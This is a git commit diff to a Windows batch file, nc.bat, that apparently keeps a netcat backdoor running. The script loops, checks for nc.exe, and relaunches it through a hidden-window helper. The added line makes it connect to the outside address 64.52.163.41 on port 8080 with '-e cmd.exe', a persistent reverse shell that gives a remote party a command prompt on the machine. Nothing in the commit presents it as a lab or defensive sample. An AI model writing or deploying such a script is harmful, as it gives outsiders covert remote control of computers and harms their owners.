7bd816e7297a1bd291104a0067fae565b51f1677
7ext 34 <55564552+7ext34@users.noreply.github.com>
2019-10-02 19:04:16 -0400

    Update nc.bat

--- nc.bat
+++ nc.bat
@@ -4,7 +4,7 @@ cls
 taskkill /f /fi "status eq not responding"
 timeout 15
 tasklist /FI "IMAGENAME eq nc.exe" 2>NUL | find /I /N "nc.exe">NUL
-if NOT "%ERRORLEVEL%" == "0" start C:\nc\rh.exe C:\nc\nc_run.bat
+if NOT "%ERRORLEVEL%" == "0" start C:\nc\rh.exe C:\nc\nc.exe 64.52.163.41 8080 -e cmd.exe
 if errorlevel 0 (
         goto loop
 )
